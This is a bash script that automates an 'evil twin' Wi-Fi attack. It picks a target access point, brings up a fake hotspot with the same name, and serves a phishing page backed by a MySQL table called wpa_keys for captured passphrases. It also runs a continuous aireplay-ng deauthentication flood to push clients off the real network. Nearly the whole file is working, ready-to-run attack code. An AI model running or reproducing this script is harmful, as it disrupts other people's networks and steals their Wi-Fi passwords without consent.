#!/bin/bash 

# Usage : ./eviltwin_MAIN.sh $1 $2 $3
# $1 = hotspot NIC
# $2 = NIC with access to internet
# $3 = NIC for booting
# ex : ./eviltwin_Main.sh wlan1 wlan0 wlan2

################################### Options ###################################
if [ "$1" = "-h" -o "$1" = "--help" ];then
	echo "# Usage : ./eviltwin_MAIN.sh [1] [2] [3]

[1] = hotspot NIC (fake AP)
[2] = NIC with access to internet
[3] = NIC for booting

# ex : ./eviltwin_Main.sh wlan1 wlan0 wlan2
"
exit 0
fi

################################### Pre-requisites ###################################
time=`date`
flag1=0

echo "[+] Checking pre-requisites... [+]"
if [ -z "$(which dnsmasq)" ];then
	echo "[-] Install package : dnsmasq" ; ((flag1=flag1+1))
fi
if [ -z "$(which hostapd)" ];then
	echo "[-] Install package : hostapd" ; ((flag1=flag1+1))
fi
if [ -z "$(which apache2)" ];then
	echo "[-] Install package : apache2" ; ((flag1=flag1+1))
fi
if [ -z "$(which dnsspoof)" ];then
	echo "[-] Install package : dnsspoof" ; ((flag1=flag1+1))
fi

if test $flag1 -gt 0;then
	echo "[-] Prerequisites not met!"
	exit
fi

sleep 0.5
################################### Choose Target ###################################
xterm -e "python pickap.py $3"
sleep 1
y=0
while read -r line
do
	if [ $y = 0 ];then
		bssid=$line
	elif [ $y = 1 ];then
		channel=$line
	elif [ $y = 2 ];then
		essid=$line
	fi
	y=$(($y + 1))
done < "pickap_return"


sleep 0.5
################################### Start Hotspot ###################################


echo "[+] Starting hotspot program... [+]"

bash eviltwin_HOTSPOT.sh $1 $2 $channel $essid &

sleep 2.0
################################### Start DB/Apache ###################################
echo "[+] Starting webserver & database [+]"
if [ -z "$(ps -e | grep apache2)" ]
then
	systemctl start apache2
fi
if [ -z "$(ps -e | grep mysql)" ]
then
	systemctl start mysql
fi

sleep 1
################################### DB Setup ###################################
# create database fakeap; use fakeap; create table wpa_keys(pass1 varchar(32), pass2 varchar(32));
# mysql --user="fakeap" --database="fakeap" --execute="describe wpa_keys; "

################################### APACHE Setup ###################################
# wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip /var/www/html
# apt install php libapache2-mod-php php-mysql

#####SET APACHE2 DEFAULT PAGE TO POP-UP

sleep 3
################################### AIREPLAY boot-off ###################################
echo "[+] Booting targets off target AP... [+]"
airmon-ng start $3 ; sleep 2
iwconfig $3 channel $channel
xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $3" &
sleep 1
xterm -hold -e "python display_pass_results.py" &


################################### Clean-Up ###################################
echo "[+] PRESS ENTER TO QUIT PROGRAM [+]"
read EXITVALUE
ip link set $1 down
ip addr flush dev $1
ip link set $1 up
iptables --flush
iptables -t nat --flush
echo 0 > /proc/sys/net/ipv4/ip_forward

if [ -n "$(ps -e | grep apache2)" ];then
	systemctl stop apache2;fi
if [ -n "$(ps -e | grep mysql)" ];then
	systemctl stop mysql;fi
kill -9 $(pgrep dnsmasq)
kill -9 $(pgrep hostapd)
pkill hostapd
airmon-ng stop $3
rm -rf pickap_return